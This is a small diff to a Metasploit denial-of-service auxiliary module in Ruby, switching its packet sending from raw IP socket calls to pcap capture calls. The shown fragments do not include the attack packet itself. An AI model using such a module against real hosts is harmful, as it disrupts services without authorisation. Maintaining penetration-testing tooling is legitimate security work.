@@ -10,7 +10,7 @@ require 'racket'
 
 class Metasploit3 < Msf::Auxiliary
 
-	include Msf::Exploit::Remote::Ip
+	include Msf::Exploit::Capture
 	include Msf::Auxiliary::Dos
 			
 	def initialize
@@ -42,7 +42,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		m = Rex::Text.rand_text_alpha_lower(3)
 		
-		connect_ip	
+		open_pcap
 
 		n = Racket::Racket.new
 
@@ -66,9 +66,9 @@ class Metasploit3 < Msf::Auxiliary
 	
 		pkt = n.pack
 
-		ip_write(pkt)
+		capture_sendto(pkt, rhost)
 
-		disconnect_ip
+		close_pcap
 
 	end
 
